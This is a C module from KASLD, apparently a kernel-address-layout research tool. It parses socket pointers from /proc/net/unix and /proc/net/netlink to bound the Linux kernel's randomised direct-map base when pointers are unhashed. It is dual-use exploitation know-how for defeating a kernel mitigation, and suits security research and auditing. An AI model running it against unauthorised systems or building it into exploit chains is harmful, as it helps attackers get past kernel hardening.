// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel direct-map addresses from the socket-pointer field of
// /proc/net/{unix,netlink}.
//
//   Subsystem:        net — proc seq-files (af_unix.c, af_netlink.c)
//   Data leaked:      a struct sock * (kmalloc slab object → direct-map VA)
//   Address type:     virtual (direct map / linear region)
//   Method:           parsed (first hex token of each data line)
//   Privilege:        unprivileged read of /proc/net/*; the pointer is
//                     printed with %pK, so the REAL address appears when
//                     read with CAP_SYSLOG (root) under kptr_restrict=1, OR
//                     for any reader when the kernel booted no_hash_pointers.
//                     Otherwise %pK is hashed to a 32-bit id, which the
//                     kernel-VAS filter below rejects — so only genuine
//                     direct-map addresses are ever emitted.
//
// Every kmalloc'd sock lives in the linear/direct map (page_offset + phys), so
// a leaked sock pointer is an interior VIRT/DIRECTMAP observation. It bounds
// Q_PAGE_OFFSET from above (page_offset ≤ addr) — useful on x86_64 where the
// direct map is randomized (CONFIG_RANDOMIZE_MEMORY); a no-op where page_offset
// is fixed. Fed to directmap_page_offset_bounds.
//
// /proc/net/unix and /proc/net/netlink are chosen because the sock pointer is
// the FIRST field of each data line (af_unix.c "%pK:", af_netlink.c "%pK "),
// and both are reliably populated (systemd/udev sockets) without privilege.
// (tcp/udp/raw print the pointer as a trailing field — left for a later
// positional parse.)
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads the socket-pointer field of /proc/net/unix and /proc/net/netlink. "
    "Each kmalloc'd struct sock lives in the kernel direct map, so its address "
    "(page_offset + phys) bounds the direct-map base from above. The pointer "
    "is "
    "printed with %pK: real for a CAP_SYSLOG reader under kptr_restrict=1, or "
    "for anyone when the kernel runs no_hash_pointers; otherwise it is hashed "
    "to a 32-bit id and discarded by the kernel-address filter. Mainly useful "
    "on x86_64, where the direct map is randomized.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:hashed_pointers>=1\n"
           "bypass:CAP_SYSLOG\n");

struct sock_range {
  unsigned long lo, hi;
  int n;
};

/* Scan one /proc/net seq-file whose data lines begin with the sock pointer.
 * The first hex token of each line is parsed; header lines ("Num"/"sk") and
 * hashed 32-bit ids fail the kernel-VAS test and are skipped. */
static void scan_sock_file(const char *path, struct sock_range *r) {
  FILE *f = kasld_fopen(path, "r");
  if (f == NULL)
    return;

  kasld_info("scanning %s for direct-map sock pointers ...", path);

  char *line = NULL;
  size_t size = 0;
  while (getline(&line, &size, f) != -1) {
    char *end = NULL;
    unsigned long addr = strtoul(line, &end, 16);
    if (end == line || addr == 0)
      continue; /* header line or non-hex first token */
    if (!kasld_addr_is_kernel_vas(addr))
      continue; /* hashed (32-bit) or non-kernel pointer */
    r->n++;
    if (r->lo == 0 || addr < r->lo)
      r->lo = addr;
    if (addr > r->hi)
      r->hi = addr;
  }

  free(line);
  fclose(f);
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);

  if (kasld_access("/proc/net/unix", R_OK) != 0 &&
      kasld_access("/proc/net/netlink", R_OK) != 0)
    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
                                               : KASLD_EXIT_UNAVAILABLE;

  struct sock_range r = {0, 0, 0};
  scan_sock_file("/proc/net/unix", &r);
  scan_sock_file("/proc/net/netlink", &r);

  if (r.lo == 0) {
    kasld_err("no real sock pointers in /proc/net/* "
              "(pointers hashed, or kptr_restrict denies the value)");
    return 0;
  }

  kasld_found("leaked %d direct-map sock pointer(s); lowest 0x%lx", r.n, r.lo);

  /* The lowest direct-map address gives the tightest page_offset ceiling; the
   * highest is an interior witness too (weak floor). Both are interior points
   * in the direct map (pos=interior via _sample). */
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, r.lo, NULL,
                      CONF_PARSED);
  if (r.hi != r.lo)
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, r.hi, NULL,
                        CONF_PARSED);

  return 0;
}
